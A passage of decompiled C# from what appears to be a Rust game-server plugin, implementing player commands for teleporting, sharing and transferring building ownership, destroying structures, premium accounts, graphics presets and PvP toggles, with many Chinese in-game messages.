													Broadcast.Notice(@class.netUser_0, "☢", Config.GetMessage("Command.Teleport.NoTeleport", @class.netUser_0, playerClient2.userName), 5f);
													return;
												}
											}
										}
									}
								}
								if (Economy.Enabled && Core.CommandTeleportPayment > 0uL)
								{
									UserEconomy userEconomy = Economy.Get(userData.SteamID);
									string newValue = Core.CommandTeleportPayment.ToString("N0") + Economy.CurrencySign;
									if (userEconomy.Balance < Core.CommandTeleportPayment)
									{
										Broadcast.Notice(@class.netUser_0, "☢", Config.GetMessage("Command.Teleport.NoEnoughCurrency", @class.netUser_0, null).Replace("%PRICE%", newValue), 5f);
										return;
									}
								}
								UserQuery userQuery = new UserQuery(bySteamID3, Config.GetMessage("Command.Teleport.Query", playerClient.netUser, null), 10u);
								userQuery.Answer.Add(new UserAnswer("CONFIRM", "RustExtended.Events.TimeEvent_TeleportTo", new object[]
								{
									playerClient.netUser,
									playerClient2.netUser,
									@class.string_0,
									Core.CommandTeleportTimewait
								}));
								userQuery.Answer.Add(new UserAnswer("ACCEPT", "RustExtended.Events.TimeEvent_TeleportTo", new object[]
								{
									playerClient.netUser,
									playerClient2.netUser,
									@class.string_0,
									Core.CommandTeleportTimewait
								}));
								userQuery.Answer.Add(new UserAnswer("*", "RustExtended.Broadcast.Message", new object[]
								{
									playerClient2.netPlayer,
									Config.GetMessage("Command.Teleport.Refuse", playerClient.netUser, null),
									"",
									0
								}));
								userQuery.Answer.Add(new UserAnswer("*", "RustExtended.Broadcast.Message", new object[]
								{
									playerClient.netPlayer,
									Config.GetMessage("Command.Teleport.Refused", playerClient2.netUser, null),
									"",
									0
								}));
								Core.ChatQuery.Add(playerClient2.userID, userQuery);
								Broadcast.Notice(playerClient2.netPlayer, "?", userQuery.Query, 5f);
								Broadcast.Message(playerClient2.netPlayer, userQuery.Query, null, 0f);
								Broadcast.Message(playerClient2.netPlayer, Config.GetMessage("Command.Teleport.Query.Help", playerClient.netUser, null), null, 0f);
							}
						}
					}
				}
				else
				{
					if (Args.Length > 0 && Args[0].Contains(","))
					{
						Args = string.Join(" ", Args).Replace(",", " ").Split(new string[]
						{
							" "
						}, StringSplitOptions.RemoveEmptyEntries);
					}
					if (Args.Length == 1)
					{
						PlayerClient playerClient2;
						if ((playerClient2 = Helper.GetPlayerClient(Args[0])) == null)
						{
							Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Command.PlayerNoFound", null, Args[0]), 5f);
							return;
						}
						if (playerClient == playerClient2)
						{
							Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Command.Teleport.OnSelf", playerClient.netUser, null), 5f);
							return;
						}
						position = playerClient2.controllable.character.transform.position + new Vector3(0f, 0.1f, 0f);
						if (!playerClient2.netPlayer.isClient || !playerClient2.hasLastKnownPosition)
						{
							Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Command.Teleport.NotCan", playerClient2.netUser, null), 5f);
							return;
						}
					}
					else if (Args.Length == 2)
					{
						if ((playerClient = Helper.GetPlayerClient(Args[0])) == null)
						{
							Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Command.PlayerNoFound", null, Args[0]), 5f);
							return;
						}
						PlayerClient playerClient2;
						if ((playerClient2 = Helper.GetPlayerClient(Args[1])) == null)
						{
							Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Command.PlayerNoFound", null, Args[1]), 5f);
							return;
						}
						if (playerClient == playerClient2)
						{
							Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Command.Teleport.ToSelf", playerClient.netUser, null), 5f);
							return;
						}
						position = playerClient2.controllable.character.transform.position + new Vector3(0f, 0.1f, 0f);
						if (!playerClient.netPlayer.isClient || !playerClient.hasLastKnownPosition)
						{
							Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Command.Teleport.NotCan", playerClient.netUser, null), 5f);
							return;
						}
						if (!playerClient2.netPlayer.isClient || !playerClient2.hasLastKnownPosition)
						{
							Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Command.Teleport.NotCan", playerClient2.netUser, null), 5f);
							return;
						}
					}
					else if (Args.Length == 3)
					{
						float x = 0f;
						float y = 0f;
						float z = 0f;
						if (!float.TryParse(Args[0], out x) || !float.TryParse(Args[1], out y) || !float.TryParse(Args[2], out z))
						{
							Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageCommand("Command.InvalidSyntax", @class.string_0, @class.netUser_0), 5f);
							return;
						}
						position = new Vector3(x, y, z);
					}
					Helper.TeleportTo(playerClient.netUser, position);
				}
			}
		}

		public static void History(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			if (Core.History.ContainsKey(Sender.userID))
			{
				List<HistoryRecord> list = Core.History[Sender.userID];
				int num = 0;
				if (Args.Length > 0)
				{
					int.TryParse(Args[0], out num);
				}
				if (num < 1)
				{
					num = Core.ChatHistoryDisplay;
				}
				if (num > list.Count)
				{
					num = list.Count;
				}
				for (int i = num; i > 0; i--)
				{
					Broadcast.Message(Sender, list[list.Count - i].Name + ": " + list[list.Count - i].Text, "历史记录", 0f);
				}
			}
		}

		public static void Share(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			if (Args == null || Args.Length == 0 || (Sender == null && Args.Length < 2))
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
			}
			else
			{
				UserData userData2 = Users.Find(Args[Args.Length - 1]);
				if ((Sender == null || Sender.admin) && Args.Length > 1)
				{
					userData = Users.Find(Args[0]);
				}
				if (userData == null)
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
				}
				else if (userData2 == null)
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[Args.Length - 1]), 5f);
				}
				else if (userData2.SteamID == userData.SteamID)
				{
					Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Share.Self", Sender, null), 5f);
				}
				else if (Users.SharedList(userData.SteamID).Contains(userData2.SteamID))
				{
					Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Share.Already", Sender, Args[0]), 5f);
				}
				else if (Sender != null && Sender.userID == userData.SteamID)
				{
					Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Share.Owner", Sender, userData2.Username), 5f);
					Users.SharedAdd(userData.SteamID, userData2.SteamID);
					NetUser netUser = NetUser.FindByUserID(userData2.SteamID);
					if (netUser != null)
					{
						Broadcast.Notice(netUser.networkPlayer, "☢", Config.GetMessage("Command.Share.Client", Sender, null), 5f);
					}
				}
				else
				{
					Users.SharedAdd(userData.SteamID, userData2.SteamID);
					Broadcast.Notice(Sender, "☢", userData.Username + "' 所有权现在共享 " + userData2.Username, 5f);
					Sender = NetUser.FindByUserID(userData.SteamID);
					NetUser netUser = NetUser.FindByUserID(userData2.SteamID);
					if (Sender != null)
					{
						Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Share.Owner", Sender, null), 5f);
					}
					if (netUser != null)
					{
						Broadcast.Notice(netUser, "☢", Config.GetMessage("Command.Share.Client", Sender, null), 5f);
					}
				}
			}
		}

		public static void Unshare(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			if (Args != null && Args.Length != 0 && (Sender != null || Args.Length >= 2))
			{
				UserData userData2 = Users.Find(Args[Args.Length - 1]);
				if ((Sender == null || Sender.admin) && Args.Length > 1)
				{
					userData = Users.Find(Args[0]);
				}
				if (userData == null)
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
				}
				else if (userData2 == null)
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[Args.Length - 1]), 5f);
				}
				else if (userData2.SteamID == userData.SteamID)
				{
					Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Unshare.Self", Sender, null), 5f);
				}
				else if (!Users.SharedList(userData.SteamID).Contains(userData2.SteamID))
				{
					Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Unshare.Already", Sender, Args[0]), 5f);
				}
				else if (Sender != null && Sender.userID == userData.SteamID)
				{
					Users.SharedRemove(userData.SteamID, userData2.SteamID);
					NetUser netUser = NetUser.FindByUserID(userData2.SteamID);
					if (netUser != null)
					{
						Broadcast.Notice(netUser, "☢", Config.GetMessage("Command.Unshare.Client", Sender, null), 5f);
					}
					Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Unshare.Owner", Sender, userData2.Username), 5f);
				}
				else
				{
					Users.SharedRemove(userData.SteamID, userData2.SteamID);
					Broadcast.Notice(Sender, "☢", userData.Username + "'所有权是不共享的 " + userData2.Username, 5f);
					Sender = NetUser.FindByUserID(userData.SteamID);
					NetUser netUser = NetUser.FindByUserID(userData2.SteamID);
					if (Sender != null)
					{
						Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Unshare.Owner", Sender, null), 5f);
					}
					if (netUser != null)
					{
						Broadcast.Notice(netUser, "☢", Config.GetMessage("Command.Unshare.Client", Sender, null), 5f);
					}
				}
			}
			else
			{
				if (Sender == null)
				{
					userData = Users.Find(Args[0]);
				}
				foreach (ulong current in Users.SharedList(userData.SteamID))
				{
					NetUser netUser = NetUser.FindByUserID(current);
					if (netUser != null)
					{
						Broadcast.Notice(netUser, "☢", Config.GetMessage("Command.Unshare.Client", Sender, null), 5f);
					}
				}
				Users.SharedClear(userData.SteamID);
				if (Sender == null)
				{
					Broadcast.Notice(Sender, "☢", userData.Username + "'s ownership unshared for all.", 5f);
				}
				else
				{
					Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Unshare.Clean", Sender, null), 5f);
				}
			}
		}

		public static void Destroy(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			if (Sender.admin)
			{
				int num = 0;
				UserData userData2 = null;
				if (Args != null && Args.Length > 0)
				{
					if (Args[0].Equals("BANNED", StringComparison.OrdinalIgnoreCase))
					{
						foreach (StructureMaster current in StructureMaster.AllStructures)
						{
							if (Users.GetBySteamID(current.ownerID).Flags.Has(UserFlags.banned) || Banned.Database.ContainsKey(current.ownerID))
							{
								Helper.DestroyStructure(current);
								num++;
							}
						}
						if (num > 0)
						{
							Broadcast.Notice(Sender, "✔", "你摧毁了 " + num + "  被Ban用户的建筑 (s)", 5f);
						}
						else
						{
							Broadcast.Notice(Sender, "✔", "没有破坏", 5f);
						}
					}
					else if (Args[0].Equals("UNUSED", StringComparison.OrdinalIgnoreCase))
					{
						foreach (StructureMaster current2 in StructureMaster.AllStructures)
						{
							if (Users.GetBySteamID(current2.ownerID) == null)
							{
								Helper.DestroyStructure(current2);
								num++;
							}
						}
						if (num > 0)
						{
							Broadcast.Notice(Sender, "✔", "你摧毁了 " + num + " 未使用的用户的建筑", 5f);
						}
						else
						{
							Broadcast.Notice(Sender, "✔", "没有破坏", 5f);
						}
					}
					else
					{
						userData2 = Users.Find(Args[0]);
						if (userData2 == null)
						{
							Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
						}
						else
						{
							foreach (StructureMaster current3 in StructureMaster.AllStructures)
							{
								if (current3.ownerID == userData2.SteamID)
								{
									num += Helper.DestroyStructure(current3);
								}
							}
							Broadcast.Notice(Sender, "✔", string.Concat(new object[]
							{
								"你摧毁了 ",
								num,
								" 个建筑零件 建筑主人 \"",
								userData2.Username,
								"\""
							}), 5f);
							Helper.Log(string.Concat(new object[]
							{
								"User [",
								userData.Username,
								":",
								userData.SteamID,
								"] has destroy ",
								num,
								" objects owned by [",
								userData2.Username,
								":",
								userData2.SteamID,
								"]."
							}), true);
						}
					}
				}
				else
				{
					IDBase iDBase = null;
					Ray eyesRay = Sender.playerClient.controllable.character.eyesRay;
					RaycastHit raycastHit;
					if (Physics.Raycast(eyesRay, out raycastHit, 1000f, -1))
					{
						iDBase = raycastHit.collider.GetComponent<IDBase>();
					}
					if (iDBase == null)
					{
						Broadcast.Notice(Sender, "✘", "You don't see anything for destroy.", 3f);
					}
					else
					{
						StructureMaster structureMaster = iDBase.idMain as StructureMaster;
						if (structureMaster == null)
						{
							Broadcast.Notice(Sender, "✘", "There are nothing for destroy.", 3f);
						}
						else
						{
							userData2 = Users.GetBySteamID(structureMaster.ownerID);
							num = Helper.DestroyStructure(structureMaster);
							Broadcast.Notice(Sender, "✔", string.Concat(new object[]
							{
								"你摧毁了  ",
								num,
								" 个建筑零件 建筑主人 \"",
								(userData2 != null) ? userData2.Username : "-",
								"\""
							}), 5f);
							Helper.Log(string.Concat(new object[]
							{
								"User [",
								userData.Username,
								":",
								userData.SteamID,
								"] has destroy ",
								num,
								" objects at ",
								structureMaster.transform.position,
								" owned by [",
								(userData2 != null) ? (userData2.Username + ":" + userData2.SteamID) : "-:-",
								"]."
							}), true);
						}
					}
				}
			}
			else if (Core.DestoryOwnership.ContainsKey(Sender.userID))
			{
				Core.DestoryOwnership.Remove(Sender.userID);
				Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Destroy.Disabled", Sender, null), 5f);
			}
			else
			{
				Core.DestoryOwnership.Add(Sender.userID, DateTime.Now.AddSeconds((double)Core.OwnershipDestroyAutoDisable));
				Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Destroy.Enabled", Sender, null), 5f);
			}
		}

		public static void Transfer(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			if (Args == null || Args.Length == 0)
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
			}
			else
			{
				UserData userData2 = Users.Find(Args[0]);
				if (userData2 == null || (userData2.HasFlag(UserFlags.admin) && !userData.HasFlag(UserFlags.admin)))
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
				}
				else if (!Sender.admin && userData2.SteamID == Sender.userID)
				{
					Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Transfer.Self", Sender, null), 5f);
				}
				else
				{
					IDBase iDBase = null;
					string text = null;
					ulong num = 0uL;
					Ray eyesRay = Sender.playerClient.controllable.character.eyesRay;
					float distance = Sender.admin ? 1000f : 10f;
					RaycastHit raycastHit;
					if (Physics.Raycast(eyesRay, out raycastHit, distance, -1))
					{
						iDBase = raycastHit.collider.GetComponent<IDBase>();
					}
					if (iDBase == null)
					{
						Broadcast.Message(Sender, Config.GetMessage("Command.Transfer.Away", Sender, null), null, 0f);
					}
					else
					{
						DeployableObject deployableObject = iDBase.idMain as DeployableObject;
						StructureMaster structureMaster = iDBase.idMain as StructureMaster;
						if (deployableObject == null && structureMaster == null)
						{
							Broadcast.Message(Sender, Config.GetMessage("Command.Transfer.SeeNothing", Sender, null), null, 0f);
						}
						else
						{
							if (deployableObject != null)
							{
								num = deployableObject.ownerID;
								text = Helper.NiceName(deployableObject.name);
							}
							if (structureMaster != null)
							{
								num = structureMaster.ownerID;
								text = Config.GetMessage("Command.Transfer.Building", Sender, null);
							}
							if (num == userData2.SteamID)
							{
								Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Transfer.AlreadyOwned", Sender, userData2.Username).Replace("%OBJECT%", text), 5f);
							}
							else if (!Sender.admin && num != userData.SteamID)
							{
								Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Transfer.NotYourOwned", Sender, userData2.Username).Replace("%OBJECT%", text), 5f);
							}
							else
							{
								if (deployableObject != null)
								{
									if (Core.CommandTransferForbidden.Contains(text, StringComparer.CurrentCultureIgnoreCase))
									{
										Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Transfer.Forbidden", Sender, userData2.Username).Replace("%OBJECT%", text), 5f);
										return;
									}
									deployableObject.creatorID = (deployableObject.ownerID = userData2.SteamID);
									deployableObject.CacheCreator();
								}
								if (structureMaster != null)
								{
									if (Core.CommandTransferForbidden.Contains("Structure", StringComparer.CurrentCultureIgnoreCase))
									{
										Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Transfer.Forbidden", Sender, userData2.Username).Replace("%OBJECT%", text), 5f);
										return;
									}
									structureMaster.creatorID = (structureMaster.ownerID = userData2.SteamID);
									structureMaster.CacheCreator();
								}
								Broadcast.Message(Sender, string.Concat(new string[]
								{
									"你转 ",
									text,
									" 到 \"",
									userData2.Username,
									"\"."
								}), null, 0f);
							}
						}
					}
				}
			}
		}

		public static void Ping(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			if (!userData.HasFlag(UserFlags.admin) || Args == null || Args.Length <= 0)
			{
				object arg = "您的平均延迟为 ";
				uLink.NetworkPlayer networkPlayer = Sender.networkPlayer;
				Broadcast.Message(Sender, arg + networkPlayer.averagePing.ToString() + " 毫秒.", null, 0f);
			}
			else
			{
				PlayerClient playerClient = Helper.GetPlayerClient(Args[0]);
				if (playerClient == null)
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
				}
				else
				{
					Broadcast.Message(Sender, string.Concat(new object[]
					{
						playerClient.netUser.displayName,
						"'平均延迟是 ",
						playerClient.netPlayer.averagePing,
						" 毫秒."
					}), null, 0f);
				}
			}
		}

		public static void Password(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			if (Args != null && Args.Length != 0)
			{
				if (Args[0].Length < 3)
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.Password.NewTooShort", Sender, null), 5f);
				}
				else if (Args[0].Length > 64)
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.Password.NewTooLong", Sender, null), 5f);
				}
				else
				{
					Broadcast.Notice(Sender, "✔", Config.GetMessage("Command.Password.Changed", Sender, null), 5f);
					userData.Password = Args[0].Trim();
					if (Users.MD5Password)
					{
						byte[] array = Encoding.UTF8.GetBytes(userData.Password);
						array = MD5.Create().ComputeHash(array);
						userData.Password = BitConverter.ToString(array, 0).Replace("-", "");
					}
				}
			}
			else if (userData.Password.IsEmpty())
			{
				Broadcast.Message(Sender, Config.GetMessage("Command.Password.IsEmpty", Sender, null), null, 0f);
			}
			else
			{
				Broadcast.Message(Sender, Config.GetMessage("Command.Password.Display", Sender, null).Replace("%PASSWORD%", userData.Password), null, 0f);
			}
		}

		public static void Set(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			string a;
			if (Args != null && Args.Length > 0 && (a = Args[0].Trim().ToUpper()) != null)
			{
				if (a == "FPS")
				{
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "gfx.ssaa false");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "gfx.ssao false");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "gfx.bloom false");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "gfx.grain false");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "gfx.shafts false");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "gfx.tonemap false");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "grass.on false");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "grass.forceredraw false");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "grass.displacement false");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "grass.shadowcast false");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "grass.shadowreceive false");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "render.level 0");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "render.vsync false");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "water.level -1");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "water.reflection false");
					Broadcast.Notice(Sender, "✔", "您的画质降低了,游戏将更流畅的进行.", 5f);
					return;
				}
				if (a == "QUALITY")
				{
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "gfx.ssaa true");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "gfx.ssao true");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "gfx.bloom true");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "gfx.grain true");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "gfx.shafts true");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "gfx.tonemap true");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "grass.on true");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "grass.forceredraw true");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "grass.displacement true");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "grass.shadowcast true");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "grass.shadowreceive true");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "render.level 1");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "render.vsync true");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "water.level 1");
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "water.reflection true");
					Broadcast.Notice(Sender, "✔", "您的画质调到最高了.", 5f);
					return;
				}
				if (a == "NUDE" || a == "NUDITY" || a == "CENSOR")
				{
					ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "censor.nudity false");
					Broadcast.Notice(Sender, "✔", "裸体已经被禁用.", 5f);
					return;
				}
			}
			Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
			Commands.Help(Sender, userData, new string[]
			{
				"set"
			}, Helper.GetAvailabledCommands(userData));
		}

		public static void Premium(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			double num = 0.0;
			if (userData.HasFlag(UserFlags.admin) && Args != null && Args.Length > 0)
			{
				UserData userData2 = Users.Find(Args[0]);
				if (userData2 == null)
				{
					Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
				}
				else if (Args.Length > 1)
				{
					if (Args[1].ToLower() == "disable" || Args[1].ToLower() == "0")
					{
						Users.SetFlags(userData2.SteamID, UserFlags.premium, false);
						Users.SetRank(userData2.SteamID, Users.DefaultRank);
						Users.SetPremiumDate(userData2.SteamID, default(DateTime));
						Commands.SaveAll(Sender);
						NetUser netUser = NetUser.FindByUserID(userData2.SteamID);
						if (netUser != null)
						{
							Broadcast.Notice(netUser, "☢", Config.GetMessage("Player.Premium.Disabled", Sender, null), 5f);
						}
						if (Sender != null)
						{
							Broadcast.Message(Sender, "您有残疾溢价账 " + userData2.Username, null, 0f);
						}
						Helper.Log(userData.Username + " 设有适合残疾人溢价账 " + userData2.Username, true);
					}
					else
					{
						bool flag = Args.Length > 1 && Args[1].StartsWith("+");
						bool flag2 = Args.Length > 1 && Args[1].StartsWith("-");
						if (Args.Length > 1)
						{
							Args[1] = Args[1].Replace("+", "").Replace("-", "").Trim();
						}
						if (!double.TryParse(Args[1], out num))
						{
							Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
						}
						else if (num > 999.0)
						{
							Broadcast.Notice(Sender, "✘", "Cannot set of premium days over is 999.", 5f);
						}
						else
						{
							DateTime date = (userData2.PremiumDate > DateTime.Now) ? userData2.PremiumDate : DateTime.Now;
							NetUser netUser;
							if (flag)
							{
								date = date.AddDays(num);
							}
							else if (flag2)
							{
								if (userData2.PremiumDate.Ticks <= 0L)
								{
									return;
								}
								if (userData2.PremiumDate.Subtract(DateTime.Now).TotalDays < num)
								{
									Users.SetFlags(userData2.SteamID, UserFlags.premium, false);
									Users.SetRank(userData2.SteamID, Users.DefaultRank);
									Users.SetPremiumDate(userData2.SteamID, default(DateTime));
									Commands.SaveAll(Sender);
									netUser = NetUser.FindByUserID(userData2.SteamID);
									if (netUser != null)
									{
										Broadcast.Notice(netUser, "☢", Config.GetMessage("Player.Premium.Disabled", Sender, null), 5f);
									}
									if (Sender != null)
									{
										Broadcast.Message(Sender, "You have disabled premium account for " + userData2.Username, null, 0f);
									}
									Helper.Log(userData.Username + " has disabled premium account for " + userData2.Username, true);
									return;
								}
								date = date.Subtract(TimeSpan.FromDays(num));
							}
							else
							{
								date = DateTime.Now.AddDays(num);
							}
							Users.SetPremiumDate(userData2.SteamID, date);
							Users.SetFlags(userData2.SteamID, UserFlags.premium, true);
							Users.SetRank(userData2.SteamID, Users.PremiumRank);
							Commands.SaveAll(Sender);
							TimeSpan timeSpan = userData2.PremiumDate.Subtract(DateTime.Now);
							if (Sender != null)
							{
								Broadcast.Message(Sender, string.Concat(new object[]
								{
									"You set ",
									timeSpan.Days,
									" day(s) of premium for ",
									userData2.Username,
									", expired: ",
									userData2.PremiumDate.ToString("dd/MM/yyyy HH:mm")
								}), null, 0f);
							}
							Helper.Log(string.Concat(new object[]
							{
								userData.Username,
								" set ",
								timeSpan.Days,
								" day(s) of premium for ",
								userData2.Username,
								", expired: ",
								userData2.PremiumDate.ToString("dd/MM/yyyy HH:mm")
							}), true);
							netUser = NetUser.FindByUserID(userData2.SteamID);
							if (netUser != null)
							{
								Broadcast.Notice(netUser, "☢", Config.GetMessage("Player.Premium.Received", Sender, null).Replace("%PREMIUM_DATE%", userData2.PremiumDate.ToString("dd/MM/yyyy HH:mm")).Replace("%PREMIUM_DAYS%", timeSpan.Days.ToString()), 5f);
							}
						}
					}
				}
				else if (userData2.PremiumDate >= DateTime.Now)
				{
					TimeSpan timeSpan = userData2.PremiumDate.Subtract(DateTime.Now);
					Broadcast.Message(Sender, string.Concat(new string[]
					{
						"Premium of ",
						userData2.Username,
						" has expires: ",
						userData2.PremiumDate.ToString("dd/MM/yyyy HH:mm"),
						" after: ",
						string.Format("{0} day(s), {1} hour(s).", timeSpan.Days, timeSpan.Hours)
					}), null, 0f);
				}
				else
				{
					userData2.PremiumDate = default(DateTime);
					Broadcast.Message(Sender, "User " + userData2.Username + " without premium account.", null, 0f);
				}
			}
			else if (userData.PremiumDate.Equals(default(DateTime)))
			{
				Broadcast.Message(Sender, Config.GetMessage("Player.Premium.Not", Sender, null), null, 0f);
			}
			else if (userData.PremiumDate >= DateTime.Now)
			{
				TimeSpan timeSpan = userData.PremiumDate.Subtract(DateTime.Now);
				Broadcast.Message(Sender, Config.GetMessage("Player.Premium.Expires", Sender, null).Replace("%PREMIUM_DATE%", userData.PremiumDate.ToString("dd/MM/yyyy HH:mm")).Replace("%PREMIUM_DAYS%", string.Format("{0} day(s), {1} hour(s).", timeSpan.Days, timeSpan.Hours)), null, 0f);
			}
			else
			{
				Users.SetFlags(userData.SteamID, UserFlags.premium, false);
				Users.SetRank(userData.SteamID, Users.DefaultRank);
				Users.SetPremiumDate(userData.SteamID, default(DateTime));
				Broadcast.Notice(Sender, "☢", Config.GetMessage("Player.Premium.Expired", Sender, null), 5f);
			}
		}

		public static void PvP(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			Predicate<Countdown> predicate = null;
			Predicate<EventTimer> predicate2 = null;
			Predicate<EventTimer> predicate3 = null;
			Commands.Class11 @class = new Commands.Class11();
			@class.netUser_0 = Sender;
			@class.string_0 = Command;
			if (@class.netUser_0 == null && Args == null)
			{
				Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageCommand("Command.InvalidSyntax", @class.string_0, @class.netUser_0), 5f);
			}
			else if (Args == null || Args.Length <= 0 || (@class.netUser_0 != null && !@class.netUser_0.admin))
			{
				if (@class.netUser_0 != null)
				{
					List<Countdown> list = Users.CountdownList(userData.SteamID);
					if (predicate == null)
					{
						predicate = new Predicate<Countdown>(@class.method_0);
					}
					Countdown countdown = list.Find(predicate);
					if (countdown != null)
					{
						if (!countdown.Expired)
						{
							TimeSpan timeSpan = TimeSpan.FromSeconds(countdown.TimeLeft);
							Broadcast.Notice(@class.netUser_0.networkPlayer, "✘", Config.GetMessage("Command.PvP.Countdown", @class.netUser_0, null).Replace("%TIME%", string.Format("{0}:{1:D2}", timeSpan.Minutes, timeSpan.Seconds)), 5f);
							return;
						}
						Users.CountdownRemove(userData.SteamID, countdown);
					}
					List<EventTimer> timer = Events.Timer;
					if (predicate2 == null)
					{
						predicate2 = new Predicate<EventTimer>(@class.method_1);
					}
					EventTimer eventTimer = timer.Find(predicate2);
					if (eventTimer != null)
					{
						if (eventTimer.TimeLeft > 0.0)
						{
							Broadcast.Notice(@class.netUser_0.networkPlayer, "☢", Config.GetMessage("Command.PvP.Wait", @class.netUser_0, null).Replace("%SECONDS%", eventTimer.TimeLeft.ToString()), 5f);
							return;
						}
						eventTimer.Dispose();
						Events.Timer.Remove(eventTimer);
					}
					if (Events.DisablePvP(@class.netUser_0, @class.string_0, (double)Core.CommandNoPVPTimewait))
					{
						List<EventTimer> timer2 = Events.Timer;
						if (predicate3 == null)
						{
							predicate3 = new Predicate<EventTimer>(@class.method_2);
						}
						eventTimer = timer2.Find(predicate3);
						if (eventTimer.TimeLeft > 0.0)
						{
							Broadcast.Notice(@class.netUser_0, "☢", Config.GetMessage("Command.PvP.Start", @class.netUser_0, null).Replace("%SECONDS%", eventTimer.TimeLeft.ToString()), 5f);
							Broadcast.NoticeAll("☢", Config.GetMessage("Command.PvP.NoticeStart", @class.netUser_0, null).Replace("%SECONDS%", eventTimer.TimeLeft.ToString()), @class.netUser_0, 5f);
						}
					}
				}
			}
			else if (Args[0].ToUpper() == "ON")
			{
				Broadcast.NoticeAll("☢", Config.GetMessage("Cycle.PvP.Enabled", null, null), null, 5f);
				server.pvp = true;
			}
			else if (Args[0].ToUpper() == "OFF")
			{
				Broadcast.NoticeAll("☢", Config.GetMessage("Cycle.PvP.Disabled", null, null), null, 5f);
				server.pvp = false;
			}
			else
			{
				userData = Users.Find(Args[0]);
				if (userData == null)
				{
					Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessage("Command.PlayerNoFound", @class.netUser_0, Args[0]), 5f);
				}
				else
				{
